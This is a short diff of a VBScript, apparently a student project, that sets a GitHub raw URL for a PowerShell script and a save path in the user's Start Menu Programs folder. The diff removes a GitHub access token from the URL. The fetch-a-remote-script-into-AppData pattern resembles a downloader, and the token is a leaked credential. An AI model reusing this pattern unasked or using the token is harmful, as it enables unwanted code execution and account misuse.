@@ -10,7 +10,7 @@ Dim objShell
 Set objNetwork = CreateObject("WScript.Network")
 userName = objNetwork.UserName
 
-url = "https://raw.githubusercontent.com/simonemichele05/PowershellProgetto/main/script.ps1?token=GHSAT0AAAAAACD46HOO5OOJY3V3IGIBKMFIZEK2PPQ"
+url = "https://raw.githubusercontent.com/simonemichele05/PowershellProgetto/main/script.ps1"
 folderPath = "C:\Users\" & userName & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\ScriptFolder"
 filePath = folderPath & "\script.ps1"
 
